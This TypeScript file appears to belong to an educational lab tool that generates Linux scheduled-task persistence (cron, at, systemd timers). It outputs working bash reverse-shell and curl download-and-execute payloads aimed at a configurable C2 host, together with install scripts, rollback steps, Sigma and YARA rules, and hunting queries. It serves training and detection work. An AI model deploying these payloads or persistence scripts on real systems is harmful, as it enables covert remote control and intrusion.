/* Simulador de persistencia con cron/at (MITRE T1053) para laboratorio — 100% local.
   Genera el payload malicioso APARENTE (didáctico), su instalación limpia,
   el rollback, y las reglas de detección: Sigma, YARA y queries de hunting.
   ⚖ Solo en TU laboratorio: instalar persistencia en equipos de terceros es delito. */

export type CronAptLocation = 'crontab' | 'cron-d' | 'cron-daily' | 'systemd-timer' | 'at'

export interface CronAptConfig {
  schedule: string // expresión cron (ignorada en 'at')
  location: CronAptLocation
  taskName: string
  user: string
  c2: string // IP:puerto de TU listener de laboratorio
  payload: 'shell' | 'downloader' | 'marker'
}

export const LOCATION_META: Record<CronAptLocation, { label: string; file: string; why: string; detect: string }> = {
  crontab: { label: 'crontab de usuario', file: '/var/spool/cron/crontabs/<user>', why: 'El clásico: sobrevive a reboots y no toca /etc. El primer sitio que mira un buen analista, el último donde mira uno novato.', detect: 'crontab -l / grep en /var/spool/cron' },
  'cron-d': { label: '/etc/cron.d/', file: '/etc/cron.d/<task>', why: 'Formato con campo de usuario. Persiste en todo el sistema y algunos admins no revisan ahí.', detect: 'ls -la /etc/cron.d/ + monitoreo de FIM' },
  'cron-daily': { label: '/etc/cron.daily/', file: '/etc/cron.daily/<task>', why: 'Se ejecuta via run-parts una vez al día: ruido bajo, aspecto de "mantenimiento".', detect: 'ls /etc/cron.daily + compare con paquetes instalados' },
  'systemd-timer': { label: 'systemd timer', file: '/etc/systemd/system/<task>.timer + .service', why: 'El estándar moderno: journalctl lo registra pero los timers se olvidan más que los crons.', detect: 'systemctl list-timers --all' },
  at: { label: 'at (one-shot)', file: '/var/spool/cron/atjobs', why: 'Ejecución ÚNICA programada: ideal para "activar algo a las 3 AM y desaparecer". No sobrevive a reboot.', detect: 'atq / ls /var/spool/cron/atjobs' },
}

export const SCHEDULE_PRESETS: { label: string; expr: string; human: string }[] = [
  { label: 'cada 5 min', expr: '*/5 * * * *', human: 'cada 5 minutos — el latido clásico de una botnet' },
  { label: '3:00 AM diaria', expr: '0 3 * * *', human: 'a las 3 de la madrugada — cuando nadie mira' },
  { label: 'domingos 4 AM', expr: '0 4 * * 0', human: 'domingo 4 AM — el mantenimiento "falso"' },
  { label: 'cada hora', expr: '0 * * * *', human: 'cada hora en punto' },
  { label: 'cada 30 s (systemd)', expr: '*-*-* *:*:30', human: 'solo válido en systemd timer con OnCalendar' },
]

const PAYLOAD_BODIES: Record<CronAptConfig['payload'], (c: CronAptConfig) => string> = {
  shell: (c) => `#!/bin/bash
# DIDÁCTICO: abre una conexión a TU listener de laboratorio
# En tu máquina: rlwrap nc -lvnp ${c.c2.split(':').pop()}
exec 3<>/dev/tcp/${c.c2.split(':')[0]}/${c.c2.split(':').pop() || '4444'}
echo -e "SHELL de laboratorio en \\$(hostname)\\n" >&3
while read -r cmd <&3; do
  [ "\\$cmd" = "salir" ] && break
  bash -c "\\$cmd" >&3 2>&3
done`,
  downloader: (c) => `#!/bin/bash
# DIDÁCTICO: stage-2 downloader con inmutabilidad mínima
# Laboratorio: sirve el stage-2 con python3 -m http.server en ${c.c2.split(':').pop()}
curl -fsS --max-time 20 http://${c.c2}/stage2.sh -o /tmp/.cache-sys || exit 0
chmod 700 /tmp/.cache-sys
/tmp/.cache-sys
rm -f /tmp/.cache-sys   # borra tras ejecutar: el archivo "nunca existió"`,
  marker: () => `#!/bin/bash
# PAYLOAD INOFENSIVO para validar detección en tu propio lab:
echo "[MARKER] persistencia ejecutada en \\$(hostname) a las \\$(date -Is)" >> /var/tmp/.lab-marker`,
}

export interface CronAptResult {
  cronLine: string
  installScript: string
  payloadFile: string
  rollback: string
  sigma: string
  yara: string
  hunting: string[]
  notes: string[]
}

const isAt = (c: CronAptConfig) => c.location === 'at'
const isTimer = (c: CronAptConfig) => c.location === 'systemd-timer'

export const buildCronApt = (c: CronAptConfig): CronAptResult => {
  const meta = LOCATION_META[c.location]
  const body = PAYLOAD_BODIES[c.payload](c)
  const payloadFile = c.location === 'cron-daily' ? `/etc/cron.daily/${c.taskName}` : `/usr/local/lib/${c.taskName}.sh`

  const cronLine = isAt(c)
    ? `echo 'bash ${payloadFile}' | at 03:00`
    : isTimer(c)
      ? `OnCalendar=${c.schedule}`
      : `${c.schedule} ${c.user} bash ${payloadFile}`

  const install = isTimer(c)
    ? `# instalación del timer (laboratorio propio)
sudo tee /usr/local/lib/${c.taskName}.sh > /dev/null <<'PAYLOAD'
${body}
PAYLOAD
chmod 700 /usr/local/lib/${c.taskName}.sh

sudo tee /etc/systemd/system/${c.taskName}.service > /dev/null <<'UNIT'
[Unit]
Description=Mantenimiento ${c.taskName} (LAB)
[Service]
Type=oneshot
ExecStart=/bin/bash ${payloadFile}
UNIT

sudo tee /etc/systemd/system/${c.taskName}.timer > /dev/null <<'UNIT'
[Unit]
Description=Timer ${c.taskName} (LAB)
[Timer]
${cronLine}
Persistent=true
[Install]
WantedBy=timers.target
UNIT

sudo systemctl daemon-reload && sudo systemctl enable --now ${c.taskName}.timer`
    : isAt(c)
      ? `# instalación one-shot con at (laboratorio propio)
sudo tee ${payloadFile} > /dev/null <<'PAYLOAD'
${body}
PAYLOAD
chmod 700 ${payloadFile}
${cronLine}`
      : `# instalación de la línea de cron (laboratorio propio)
sudo tee ${payloadFile} > /dev/null <<'PAYLOAD'
${body}
PAYLOAD
chmod 700 ${payloadFile}

( crontab -l -u ${c.user} 2>/dev/null; echo '${c.schedule} ${c.user === 'root' ? '' : ''}bash ${payloadFile}' ) | crontab -u ${c.user} -`

  const rollback = isTimer(c)
    ? `sudo systemctl disable --now ${c.taskName}.timer
sudo rm -f /etc/systemd/system/${c.taskName}.timer /etc/systemd/system/${c.taskName}.service ${payloadFile}
sudo systemctl daemon-reload`
    : isAt(c)
      ? `atq                       # lista el job (nº)
atrm <nº>                 # lo elimina
sudo rm -f ${payloadFile}`
      : `crontab -l -u ${c.user}   # localiza la línea
crontab -l -u ${c.user} | grep -v '${c.taskName}' | crontab -u ${c.user} -
sudo rm -f ${payloadFile}`

  const sigma = `title: Persistencia sospechosa via ${meta.label} (${c.taskName})
status: experimental
description: Tarea programada ejecutando bash desde ruta no estándar hacia ${
    c.payload === 'shell' ? 'conexión TCP saliente' : c.payload === 'downloader' ? 'descarga y ejecución de stage-2' : 'escritura de marcador'
  }.
logsource:
    product: linux
    service: cron          # o auditd: syscall=execve parent=crond
detection:
    selection:
        - Image|endswith: '/bash'
          ParentImage|endswith: '/cron'
          CommandLine|contains: '${c.taskName}'
    condition: selection
falsepositives:
    - scripts de administración legítimos en /usr/local
level: high
tags:
    - attack.persistence
    - attack.t1053.003      # cron
    - attack.t1053          # scheduled task`

  const yara = `rule Lab_Persist_${c.taskName.replace(/[^\w]/g, '_')} {
  meta:
    description = "Script de persistencia didáctico de laboratorio"
    author = "HackNexus (educativo)"
  strings:
    $shebang = "#!/bin/bash"
    $marcas = { 2f 74 6d 70 2f 2e }              // rutas ocultas /tmp/.
    $tcp = /\\/dev\\/tcp\\//                        // shell inversa pura bash
    $curl = "curl -fsS" ascii
  condition:
    $shebang at 0 and filesize < 4KB and ( 1 of ($marcas*, $tcp, $curl) )
}`

  const hunting = [
    `crontab -l -u ${c.user}; sudo ls -la /etc/cron.d/ /etc/cron.daily/ /etc/cron.hourly/`,
    'sudo systemctl list-timers --all --no-pager | grep -v -E "apt|logrotate|fstrim|man-db"',
    `sudo grep -r "${c.taskName}" /etc/cron* /var/spool/cron 2>/dev/null`,
    'sudo journalctl -u cron --since "24 hours ago" | grep -v session',
    'find /usr/local/lib /var/tmp /tmp -name ".*" -type f -mtime -7 2>/dev/null   # ocultos recientes',
    `sudo auditctl -w /etc/cron.d/ -p wa -k cron_change   # FIM: vigila cambios futuros`,
  ]

  const notes = [
    `T1053.00${c.location === 'crontab' ? '3' : c.location === 'systemd-timer' ? '6' : '3'}: la subtécnica exacta cambia según el mecanismo.`,
    'El edge de esta técnica es que CRON ejecuta con el entorno mínimo: variables de PATH distintas, sin tu perfil. Payloads que dependen del entorno fallan silenciosamente.',
    'Detección fuerte = línea de tiempo: cambio en cron* + proceso hijo de crond + conexión saliente en la misma ventana.',
    '⚖ Laboratorio propio únicamente. En un pentest real, la persistencia debe estar explícitamente en el alcance y documentarse para su limpieza.',
  ]

  return { cronLine, installScript: install, payloadFile, rollback, sigma, yara, hunting, notes }
}
